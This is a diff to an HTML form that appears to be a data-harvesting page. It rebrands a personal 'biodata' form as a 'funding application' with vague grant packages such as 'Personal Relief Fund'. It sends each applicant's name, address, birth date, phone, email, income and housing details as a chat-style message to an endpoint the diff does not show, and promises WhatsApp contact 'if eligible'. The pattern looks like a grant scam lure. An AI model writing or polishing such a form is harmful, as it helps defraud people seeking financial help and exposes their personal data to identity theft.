@@ -99,7 +99,7 @@ margin-top:10px;
 <label>Date of Birth</label>
 <input type="date" id="dob" required>
 
-<label>Phone Number</label>
+<label>Phone Number[ set up WhatsApp account]</label>
 <input type="tel" id="phone" placeholder="Enter your phone number" required>
 
 <label>Email Address</label>
@@ -110,6 +110,16 @@ margin-top:10px;
 
 <label>Monthly Income</label>
 <input type="text" id="income" placeholder="Enter your monthly income">
+
+<!-- 🟢 UPDATED PACKAGES -->
+<label>Funding Package</label>
+<select id="package">
+<option value="Youth Empowerment">Youth Empowerment</option>
+<option value="Educational Support">Educational Support</option>
+<option value="Personal Relief Fund">Personal Relief Fund</option>
+<option value="Agriculture">Agriculture</option>
+<option value="Business Development Funds">Business Development Funds</option>
+</select>
 
 <label>Gender</label>
 <select id="gender">
@@ -136,7 +146,7 @@ document.getElementById("bioForm").addEventListener("submit", async function(e){
 e.preventDefault();
 
 let message =
-`📥 NEW BIODATA SUBMISSION
+`📥 NEW FUNDING APPLICATION
 
 👤 Name: ${name.value}
 🏠 Address: ${address.value}
@@ -145,6 +155,7 @@ let message =
 📧 Email: ${email.value}
 💼 Occupation: ${occupation.value}
 💰 Income: ${income.value}
+📦 Funding Package: ${package.value}
 🚻 Gender: ${gender.value}
 🏡 Housing: ${housing.value}`;
 
@@ -157,7 +168,7 @@ text: message
 })
 });
 
-alert("✅ Submitted successfully!\n\nWe will contact you via WhatsApp or Email if you are eligible.");
+alert("✅ Application submitted successfully!\n\nWe will contact you via WhatsApp or Email if you are eligible.");
 
 this.reset();
 });
